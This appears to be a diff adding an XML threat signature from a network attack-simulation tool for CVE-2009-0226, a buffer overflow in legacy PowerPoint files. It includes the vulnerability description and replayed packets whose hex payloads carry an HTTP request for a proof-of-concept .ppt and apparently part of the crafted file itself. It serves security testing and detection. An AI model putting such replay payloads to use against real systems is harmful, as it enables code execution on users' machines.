@@ -1,0 +1,85 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Office PowerPoint Legacy Format Schemes Record Buffer Overflow"/>
+    <EngDesc display="true" value="A buffer overflow vulnerability exists in Microsoft Office PowerPoint. The flaw is due to a boundary error when processing crafted legacy PowerPoint (PPT) documents. An attacker could exploit this vulnerability by persuading the target user to open a specially crafted legacy PowerPointdocument. In an attack case where code injection is successful, the behaviour of the target is entirely dependent on the intended function of the injected code. The injected code in such a case would execute within the security context of the logged in user. In an attack case where code injection is not successful, the affected application will terminate abnormally, potentially resulting in loss of unsaved data."/>
+    <Intent display="true">
+      <item value="Code_Execution/Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/HTTPS/FTP/IMAP/POP3/SMB/CIFS/SMTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Office_PowerPoint"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Office_PowerPoint_2000&amp;2002&amp;2003"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2009-0226"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="01d41b5d160cfba5127f80d810e9618b"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633982149612958137"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1262514640" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="Z"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="AA"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="Z"/>
+      <for index="AA"/>
+    </for>
+    <for index="T">
+      <for index="Z"/>
+      <for index="AA"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:0C:29:BF:B2:91" destMac="00:1B:78:75:79:68" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0249" Identification="06CD" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="9007" srcIP="172.16.8.184" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="1077" destPort="$HTTPdestPort" SeqNumber="2676BC73" AckNumber="BBC19914" HeaderLength="05" WindowSize="FAF0" Checksum="3B00" UrgentPointer="0000" Options="" Payload="474554202F7E6D626F68696F2F706F632E70707420485454502F312E310D0A4163636570743A20696D6167652F6769662C20696D6167652F782D786269746D61702C20696D6167652F6A7065672C20696D6167652F706A7065672C206170706C69636174696F6E2F782D73686F636B776176652D666C6173682C206170706C69636174696F6E2F766E642E6D732D657863656C2C206170706C69636174696F6E2F766E642E6D732D706F776572706F696E742C206170706C69636174696F6E2F6D73776F72642C206170706C69636174696F6E2F782D6D732D6170706C69636174696F6E2C206170706C69636174696F6E2F782D6D732D786261702C206170706C69636174696F6E2F766E642E6D732D787073646F63756D656E742C206170706C69636174696F6E2F78616D6C2B786D6C2C202A2F2A0D0A4163636570742D4C616E67756167653A20656E2D75730D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E313B205356313B202E4E455420434C5220322E302E35303732373B202E4E455420434C5220332E302E343530362E323135323B202E4E455420434C5220332E352E3330373239290D0A486F73743A203137322E31362E312E320D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="T" Count="">
+      <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:BF:B2:91" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="029F" Identification="86E6" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="4F98" srcIP="$destIP" destIP="172.16.8.184" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="1077" SeqNumber="BBC1D21C" AckNumber="2676BE94" HeaderLength="05" WindowSize="198C" Checksum="0EC8" UrgentPointer="0000" Options="" Payload="001402000000001C000000FB02E0FF0000000000009001000000000040000054696D6573204E657720526F6D616E0062AFF4776BAFF4770100000000003000040000002D01050004000000F00103000500000009020000000205000000140200000000050000002E0118000000050000000201010000001B000000320AD800D0000D0000005465737420646F63756D656E740013000F000B0009000800100010000F00100018000F000F000900050000002E01010000000500000002010200000005000000020102000000040000002D010100040000002D0104001C000000FB021000070000000000BC02000000000102022253797374656D000000000A000000040000000000030000000100000000003000040000002D01030004000000F00105000F00000026060F001400544E505004000C000000000000000000000000000900000026060F000800FFFFFFFF0100000003000000000074000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
